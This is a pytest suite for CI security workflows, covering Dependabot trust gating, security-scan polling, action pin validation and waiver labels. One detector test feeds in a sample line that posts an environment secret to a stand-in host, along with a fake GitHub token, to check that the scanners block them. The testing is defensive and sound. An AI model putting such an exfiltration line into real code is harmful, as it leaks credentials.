"""Exercise security CI access through workflow shells and simulated GitHub APIs."""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

# Reuse realistic GitHub trees and release fixtures from the merge-policy scenarios.
from tests.scripts.test_dependabot_automerge import (
    PREFIX,
    set_changed_files,
)
from tests.scripts.test_dependabot_automerge import (
    api as api,
)
from tests.scripts.test_dependabot_automerge import (
    expanded_update as expanded_update,
)

_WORKFLOW = Path(__file__).resolve().parents[2] / ".github/workflows/security-gate.yml"
_HEAD_SHA = "a" * 40


def _scan(conclusion: str | None, started_at: str = "2026-09-16T00:00:00Z") -> dict:
    return {
        "name": "Security Scan",
        "started_at": started_at,
        "status": "completed" if conclusion else "in_progress",
        "conclusion": conclusion,
        "html_url": "https://github.com/example/project/actions/runs/42/job/1",
    }


def _run_gate(
    tmp_path: Path, scans_by_poll: list[list[dict]], *, held: bool = False
) -> tuple[subprocess.CompletedProcess[str], list[str]]:
    workflow = yaml.safe_load(_WORKFLOW.read_text())
    script = next(
        step["run"]
        for step in workflow["jobs"]["gate"]["steps"]
        if step["name"] == "Wait for Security Scan result"
    )
    fixture = tmp_path / "api.json"
    fixture.write_text(json.dumps({"scans": scans_by_poll, "held": held}))
    gh = tmp_path / "gh"
    gh.write_text(
        f"#!{sys.executable}\n"
        """
import json
import os
import sys
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

root = Path(os.environ['GATE_FIXTURES'])
fixture = json.loads((root / 'api.json').read_text())
endpoint = sys.argv[2]
parsed = urlsplit(endpoint)
query = parse_qs(parsed.query)
if parsed.path.endswith('/actions/runs'):
    assert query['head_sha'] == [os.environ['HEAD_SHA']]
    print('action_required' if fixture['held'] else 'null')
elif parsed.path.endswith('/check-runs'):
    assert parsed.path == f"repos/example/project/commits/{os.environ['HEAD_SHA']}/check-runs"
    count_path = root / 'poll-count'
    count = int(count_path.read_text()) if count_path.exists() else 0
    count_path.write_text(str(count + 1))
    scans = fixture['scans'][min(count, len(fixture['scans']) - 1)]
    # GitHub filters before pagination. Newer unrelated checks fill page one.
    checks = [
        dict(name=f'Other check {i}', status='completed', conclusion='success',
             started_at='2026-09-17T00:00:00Z')
        for i in range(40)
    ] + scans
    if 'check_name' in query:
        checks = [c for c in checks if c['name'] == query['check_name'][0]]
    print(json.dumps({'total_count': len(checks), 'check_runs': checks[:30]}))
else:
    raise AssertionError(f'Unexpected API call: {endpoint}')
"""
    )
    gh.chmod(0o755)
    sleep = tmp_path / "sleep"
    sleep.write_text('#!/usr/bin/env bash\nprintf "%s\\n" "$1" >> "$GATE_FIXTURES/sleeps"\n')
    sleep.chmod(0o755)
    env = dict(
        os.environ,
        PATH=f"{tmp_path}{os.pathsep}{os.environ['PATH']}",
        GATE_FIXTURES=str(tmp_path),
        GH_TOKEN="unused-test-token",
        REPO="example/project",
        HEAD_SHA=_HEAD_SHA,
    )
    result = subprocess.run(
        ["bash", "-e", "-o", "pipefail", "-c", script],
        env=env,
        capture_output=True,
        text=True,
        timeout=15,
    )
    sleeps = tmp_path / "sleeps"
    return result, sleeps.read_text().splitlines() if sleeps.exists() else []


@pytest.mark.parametrize(
    "conclusion,exit_code", [("success", 0), ("failure", 1), ("cancelled", 1), ("timed_out", 1)]
)
def test_finds_completed_scan_beyond_first_unfiltered_page(
    tmp_path: Path, conclusion: str, exit_code: int
) -> None:
    result, sleeps = _run_gate(tmp_path, [[_scan(conclusion)]])
    assert result.returncode == exit_code, result.stdout + result.stderr
    assert f"Security Scan concluded: {conclusion}" in result.stdout
    assert not sleeps
    if exit_code:
        assert "dependent CI is blocked" in result.stdout
        assert _scan(conclusion)["html_url"] in result.stdout


@pytest.mark.parametrize("newest_first", [False, True])
def test_waits_for_newer_scan_instead_of_accepting_old_success(
    tmp_path: Path, newest_first: bool
) -> None:
    old = _scan("success")
    pending = _scan(None, "2026-09-16T01:00:00Z")
    finished = _scan("success", "2026-09-16T01:00:00Z")
    polls = [[old, pending], [old, finished]]
    if newest_first:
        polls = [list(reversed(scans)) for scans in polls]
    result, sleeps = _run_gate(tmp_path, polls)
    assert result.returncode == 0, result.stdout + result.stderr
    assert "Security Scan concluded: success" in result.stdout
    assert sleeps == ["30"]


def test_missing_scan_preserves_existing_timeout_policy(tmp_path: Path) -> None:
    result, sleeps = _run_gate(tmp_path, [[]])
    assert result.returncode == 0, result.stdout + result.stderr
    assert "Security Scan check did not complete in time; proceeding (fail-open)" in result.stdout
    assert sleeps == ["30"] * 18


def test_held_scan_preserves_existing_approval_handling(tmp_path: Path) -> None:
    result, sleeps = _run_gate(tmp_path, [[]], held=True)
    assert result.returncode == 0, result.stdout + result.stderr
    assert "awaiting maintainer approval" in result.stdout
    assert not sleeps
    assert not (tmp_path / "poll-count").exists()


_ROOT = _WORKFLOW.parents[2]


def _steps(workflow: str, job: str) -> list[dict]:
    return yaml.safe_load((_ROOT / ".github/workflows" / workflow).read_text())["jobs"][job][
        "steps"
    ]


def _trust_gate(tmp_path: Path, workflow: str, **overrides: str) -> dict[str, str]:
    job = "gate" if workflow == "security-gate.yml" else "scan"
    step = next(step for step in _steps(workflow, job) if step.get("id") == "gate")
    # Resolve the event expressions at the workflow-to-shell boundary.
    context = {
        "github.event_name": "pull_request",
        "github.event.pull_request.author_association": "NONE",
        "github.event.pull_request.user.login": "dependabot[bot]",
        "github.event.pull_request.user.type": "Bot",
        "github.event.pull_request.head.repo.full_name": "example/project",
        "github.repository": "example/project",
    }
    env = {
        key: context.get(value.removeprefix("${{ ").removesuffix(" }}"), "")
        if value.startswith("${{")
        else value
        for key, value in step["env"].items()
    }
    output = tmp_path / "trust-outputs"
    result = subprocess.run(
        ["bash", "-eo", "pipefail", "-c", step["run"]],
        cwd=_ROOT,
        env=os.environ | env | overrides | {"GITHUB_OUTPUT": str(output)},
        text=True,
        capture_output=True,
        timeout=10,
    )
    assert result.returncode == 0, result.stdout + result.stderr
    return dict(line.split("=", 1) for line in output.read_text().splitlines())


@pytest.mark.parametrize("workflow", ["security-gate.yml", "security-scan.yml"])
@pytest.mark.parametrize("association", ["NONE", "MEMBER"])
def test_verified_dependabot_ci_access_keeps_merge_scan(tmp_path, workflow, association):
    outputs = _trust_gate(tmp_path, workflow, AUTHOR_ASSOCIATION=association)
    assert outputs["dependabot"] == "true"
    assert outputs["scan"] == str(workflow == "security-scan.yml").lower()


@pytest.mark.parametrize("workflow", ["security-gate.yml", "security-scan.yml"])
@pytest.mark.parametrize(
    "identity",
    [
        {"PR_AUTHOR_TYPE": "User"},
        {"PR_AUTHOR_TYPE": ""},
        {"PR_HEAD_REPO": "outsider/fork"},
        {"PR_HEAD_REPO": ""},
        {"REPO": ""},
    ],
)
def test_unverified_dependabot_cannot_use_ci_exception(tmp_path, workflow, identity):
    outputs = _trust_gate(tmp_path, workflow, AUTHOR_ASSOCIATION="MEMBER", **identity)
    assert outputs["dependabot"] == "false"
    assert outputs["scan"] == "true"


@pytest.mark.parametrize("workflow", ["security-gate.yml", "security-scan.yml"])
def test_external_contributor_still_requires_scanning(tmp_path, workflow):
    outputs = _trust_gate(tmp_path, workflow, PR_AUTHOR="contributor", PR_AUTHOR_TYPE="User")
    assert outputs["scan"] == "true"


def _access_environment(tmp_path, api):
    (tmp_path / "api.json").write_text(json.dumps(api["routes"]))
    gh = tmp_path / "gh"
    gh.write_text(
        f"#!{sys.executable}\n"
        + """
import json, os, sys
from pathlib import Path
root = Path(os.environ['ACCESS_FIXTURES'])
args = sys.argv[1:]
assert args[0] == 'api', args
with (root / 'access-calls').open('a') as log:
    log.write(args[1] + '\\n')
value = json.loads((root / 'api.json').read_text())[args[1]]
if len(args) > 2:
    assert args[2:] == ['--jq', '[.labels[].name] | index("skip-security-scan") != null'], args
    value = any(label['name'] == 'skip-security-scan' for label in value['labels'])
print(json.dumps(value))
"""
    )
    gh.chmod(0o755)
    python = tmp_path / "python3"
    python.write_text(f'#!/bin/sh\nexec "{sys.executable}" "$@"\n')
    python.chmod(0o755)
    return dict(
        os.environ,
        PATH=f"{tmp_path}{os.pathsep}{os.environ['PATH']}",
        ACCESS_FIXTURES=str(tmp_path),
        REPO="example/project",
        PR="123",
        HEAD_SHA=_HEAD_SHA,
        GH_TOKEN="test-only",
    )


def _run_access(tmp_path, api, **environment):
    env = _access_environment(tmp_path, api)
    for name, value in environment.items():
        if value is None:
            env.pop(name, None)
        else:
            env[name] = value
    step = next(
        step
        for step in _steps("security-gate.yml", "gate")
        if step["name"] == "Validate Dependabot CI access"
    )
    assert step["if"] == "${{ steps.gate.outputs.dependabot == 'true' }}"
    return subprocess.run(
        ["bash", "-eo", "pipefail", "-c", step["run"]],
        cwd=_ROOT,
        env=env,
        text=True,
        capture_output=True,
        timeout=15,
    )


def test_package_ci_does_not_wait_for_scan_or_advisories(tmp_path, api):
    for name in list(api["routes"]):
        if "Security Scan" in name or "Trivy" in name:
            del api["routes"][name]
    result = _run_access(tmp_path, api)
    assert result.returncode == 0, result.stdout + result.stderr
    assert "Security Scan still gates merge" in result.stdout
    assert (tmp_path / "access-calls").read_text().splitlines() == [
        f"{PREFIX}/pulls/123",
        f"{PREFIX}/pulls/123/files?per_page=100&page=1",
    ]


@pytest.mark.parametrize(
    "environment", [{"PR": ""}, {"PR": "not-a-number"}, {"REPO": None}, {"HEAD_SHA": None}]
)
def test_invalid_pr_environment_has_access_denied_annotation(tmp_path, api, environment):
    result = _run_access(tmp_path, api, **environment)
    assert result.returncode == 1
    assert "::error::Dependabot CI access denied" in result.stdout
    assert "Traceback" not in result.stderr


def test_security_gate_callers_grant_metadata_read_permission():
    for path in (_ROOT / ".github/workflows").glob("*.yml"):
        workflow = yaml.safe_load(path.read_text())
        for job in workflow.get("jobs", {}).values():
            if job.get("uses") == "./.github/workflows/security-gate.yml":
                permissions = job.get("permissions", workflow.get("permissions", {}))
                assert permissions["contents"] == "read", path
                assert permissions["pull-requests"] in {"read", "write"}, path


@pytest.mark.parametrize("fault", ["head", "fork", "spoof", "inventory", "api"])
def test_access_fails_closed_on_changed_or_incomplete_api_data(tmp_path, api, fault):
    pull = api["routes"][f"{PREFIX}/pulls/123"]
    if fault == "head":
        pull["head"]["sha"] = "c" * 40
    elif fault == "fork":
        pull["head"]["repo"]["full_name"] = "outsider/fork"
    elif fault == "spoof":
        pull["user"]["type"] = "User"
    elif fault == "inventory":
        pull["changed_files"] = 2
    else:
        del api["routes"][f"{PREFIX}/pulls/123"]
    result = _run_access(tmp_path, api)
    assert result.returncode == 1, result.stdout + result.stderr
    assert "CI access denied" in result.stdout


@pytest.mark.parametrize("expanded_update", ["github-actions"], indirect=True)
@pytest.mark.parametrize("fault", [None, "structure", "release", "pin", "rename"])
@pytest.mark.parametrize(
    "action_path", [".github/workflows/ci.yml", ".github/actions/setup-uv/action.yml"]
)
def test_actions_pass_real_policy_before_ci(tmp_path, expanded_update, fault, action_path):
    _, api = expanded_update
    old, new = api["files"][".github/workflows/ci.yml"]
    path = action_path
    set_changed_files(api, {path: (old, new)})
    if fault == "structure":
        old, new = api["files"][path]
        set_changed_files(api, {path: (old, new.replace("ubuntu-latest", "windows-latest"))})
    elif fault == "release":
        api["routes"]["repos/actions/checkout/releases/tags/v4.2.0"]["prerelease"] = True
    elif fault == "pin":
        api["routes"]["repos/actions/checkout/tags?per_page=100&page=1"][1]["commit"]["sha"] = (
            "c" * 40
        )
    elif fault == "rename":
        api["routes"][f"{PREFIX}/pulls/123/files?per_page=100&page=1"][0]["status"] = "renamed"
    result = _run_access(tmp_path, api)
    assert result.returncode == (1 if fault else 0), result.stdout + result.stderr
    if fault is None:
        assert "structural and release pin checks" in result.stdout


@pytest.mark.parametrize(
    "path", [".github/workflows/ci.yml", ".github/actions/setup-uv/action.yml"]
)
@pytest.mark.parametrize("validated", ["true", "false"])
def test_sensitive_paths_require_validated_action_pins(tmp_path, path, validated):
    changed = tmp_path / "changed.txt"
    changed.write_text(path + "\n")
    result = subprocess.run(
        ["bash", str(_ROOT / ".github/scripts/security-scan/sensitive-paths.sh")],
        env=dict(os.environ, CHANGED_FILES=str(changed), DEPENDABOT_WORKFLOW_PINS=validated),
        text=True,
        capture_output=True,
        timeout=10,
    )
    assert result.returncode == (0 if validated == "true" else 1), result.stdout + result.stderr


def test_dependabot_scan_still_runs_other_detectors():
    steps = _steps("security-scan.yml", "scan")
    for name in [
        "Secret scan (added lines)",
        "Exfil scan (added lines)",
        "Sensitive-path guard",
        "Workflow misuse lint",
        "Semgrep (changed files, local rules)",
    ]:
        step = next(step for step in steps if step["name"] == name)
        assert step["if"] == "${{ steps.gate.outputs.scan == 'true' }}"
    for workflow, job in [("security-gate.yml", "gate"), ("security-scan.yml", "scan")]:
        checkout = _steps(workflow, job)[0]
        assert "uses" not in checkout
        assert "fetch --depth=1 origin main" in checkout["run"]
        assert "git checkout --detach FETCH_HEAD" in checkout["run"]


@pytest.mark.parametrize(
    "detector,payload",
    [
        ("Secret scan (added lines)", 'TOKEN = "ghp_' + "A" * 36 + '"'),
        (
            "Exfil scan (added lines)",
            "requests.post('http://example.test', data=os.environ['DATABRICKS_CLIENT_SECRET'])",
        ),
    ],
)
def test_dependabot_diff_still_blocks_on_detector_findings(tmp_path, detector, payload):
    from tests.scripts.test_exfil_scan import _diff

    outputs = _trust_gate(tmp_path, "security-scan.yml")
    assert outputs["scan"] == "true"
    step = next(step for step in _steps("security-scan.yml", "scan") if step["name"] == detector)
    diff = tmp_path / "pr.diff"
    diff.write_text(_diff("tests/test_dependency.py", [payload]))
    result = subprocess.run(
        ["bash", "-eo", "pipefail", "-c", step["run"]],
        cwd=_ROOT,
        env=dict(os.environ, DIFF_FILE=str(diff)),
        text=True,
        capture_output=True,
        timeout=10,
    )
    assert result.returncode == 1, result.stdout + result.stderr
    assert "::error" in result.stdout


@pytest.mark.parametrize(
    "workflow,job", [("security-gate.yml", "gate"), ("security-scan.yml", "scan")]
)
def test_trusted_bootstrap_fetches_main_without_running_changed_actions(tmp_path, workflow, job):
    repository = tmp_path / "server/example/project.git"
    repository.mkdir(parents=True)
    subprocess.run(["git", "init", "-b", "main", str(repository)], check=True, capture_output=True)
    marker = repository / ".github/scripts/security-scan/marker"
    marker.parent.mkdir(parents=True)
    marker.write_text("trusted main scanner")
    subprocess.run(["git", "-C", str(repository), "add", "."], check=True)
    subprocess.run(
        [
            "git",
            "-C",
            str(repository),
            "-c",
            "user.name=Test",
            "-c",
            "user.email=test@example.test",
            "commit",
            "-m",
            "trusted scanner",
        ],
        check=True,
        capture_output=True,
    )
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    step = _steps(workflow, job)[0]
    result = subprocess.run(
        ["bash", "-eo", "pipefail", "-c", step["run"]],
        cwd=workspace,
        env=dict(
            os.environ,
            GITHUB_SERVER_URL=str(tmp_path / "server"),
            REPO="example/project",
            GH_TOKEN="test-only",
        ),
        text=True,
        capture_output=True,
        timeout=15,
    )
    assert result.returncode == 0, result.stdout + result.stderr
    assert (
        workspace / ".github/scripts/security-scan/marker"
    ).read_text() == "trusted main scanner"
    config = subprocess.run(
        ["git", "config", "--local", "--list"],
        cwd=workspace,
        check=True,
        text=True,
        capture_output=True,
    ).stdout
    assert "extraheader" not in config.lower()
    assert "test-only" not in config


@pytest.mark.parametrize("expanded_update", ["github-actions"], indirect=True)
@pytest.mark.parametrize(
    "action",
    [
        "actions/setup-node",
        "softprops/action-gh-release",
        "actions/create-github-app-token",
        "actions/attest",
        "pypa/gh-action-pypi-publish",
    ],
)
def test_action_ci_access_preserves_manual_exceptions(tmp_path, expanded_update, action):
    _, api = expanded_update
    path = ".github/workflows/ci.yml"
    old, new = api["files"][path]
    set_changed_files(
        api,
        {path: (old.replace("actions/checkout", action), new.replace("actions/checkout", action))},
    )
    for endpoint in list(api["routes"]):
        if endpoint.startswith("repos/actions/checkout/"):
            api["routes"][
                endpoint.replace("actions/checkout", action).replace("v4.2.0", "v5.0.0")
            ] = api["routes"].pop(endpoint)
    tags = api["routes"][f"repos/{action}/tags?per_page=100&page=1"]
    tags[1]["name"] = "v5.0.0"
    result = _run_access(tmp_path, api)
    allowed = action == "actions/setup-node"
    assert result.returncode == (0 if allowed else 1), result.stdout + result.stderr
    assert (
        "structural and release pin checks" if allowed else "requires human review"
    ) in result.stdout


@pytest.mark.parametrize(
    "identity",
    [
        {},
        {"PR_AUTHOR_TYPE": "User"},
        {"PR_HEAD_REPO": "outsider/fork"},
        {"PR_AUTHOR": "contributor", "PR_AUTHOR_TYPE": "User"},
    ],
)
def test_explicit_scan_waiver_preserves_manual_handling(tmp_path, api, identity):
    api["routes"][f"{PREFIX}/pulls/123"]["labels"] = [{"name": "skip-security-scan"}]
    env = _access_environment(tmp_path, api)
    outputs = _trust_gate(tmp_path, "security-scan.yml", **(env | identity))
    assert outputs["scan"] == "false"
    assert "skip-security-scan" in outputs["reason"]
    assert outputs.get("dependabot", "false") == "false"


@pytest.mark.parametrize("fault", ["missing_token", "missing_number", "api_error", "no_label"])
def test_dependabot_waiver_lookup_fails_closed(tmp_path, api, fault):
    pull = api["routes"][f"{PREFIX}/pulls/123"]
    pull["labels"] = [{"name": "skip-security-scan"}]
    if fault == "api_error":
        del api["routes"][f"{PREFIX}/pulls/123"]
    elif fault == "no_label":
        pull["labels"] = []
    env = _access_environment(tmp_path, api)
    if fault == "missing_token":
        env["GH_TOKEN"] = ""
    elif fault == "missing_number":
        env["PR"] = ""
    outputs = _trust_gate(tmp_path, "security-scan.yml", **env)
    assert outputs["scan"] == "true"
    assert outputs["dependabot"] == "true"


@pytest.mark.parametrize("expanded_update", ["github-actions"], indirect=True)
@pytest.mark.parametrize("waived", [False, True])
def test_manual_scan_waiver_controls_pin_only_ci_gate(tmp_path, expanded_update, waived):
    _, api = expanded_update
    path = ".github/workflows/ci.yml"
    old, new = api["files"][path]
    set_changed_files(api, {path: (old, new.replace("ubuntu-latest", "windows-latest"))})
    api["routes"][f"{PREFIX}/pulls/123"]["labels"] = (
        [{"name": "skip-security-scan"}] if waived else []
    )
    # Per-workflow gates have no label token; the helper reads the current label.
    outputs = _trust_gate(tmp_path, "security-gate.yml")
    assert outputs["dependabot"] == "true"
    assert outputs["scan"] == "false"
    result = _run_access(tmp_path, api)
    assert result.returncode == (0 if waived else 1), result.stdout + result.stderr
    if waived:
        assert "skip-security-scan" in result.stdout
        assert (tmp_path / "access-calls").read_text().splitlines() == [f"{PREFIX}/pulls/123"]
    else:
        assert "Workflow content changed beyond action pins" in result.stdout


@pytest.mark.parametrize("fault", ["head", "fork", "spoof"])
def test_manual_ci_waiver_still_verifies_bot_and_head(tmp_path, api, fault):
    pull = api["routes"][f"{PREFIX}/pulls/123"]
    pull["labels"] = [{"name": "skip-security-scan"}]
    if fault == "head":
        pull["head"]["sha"] = "c" * 40
    elif fault == "fork":
        pull["head"]["repo"]["full_name"] = "outsider/fork"
    else:
        pull["user"]["type"] = "User"
    result = _run_access(tmp_path, api)
    assert result.returncode == 1, result.stdout + result.stderr
    assert "CI access denied" in result.stdout
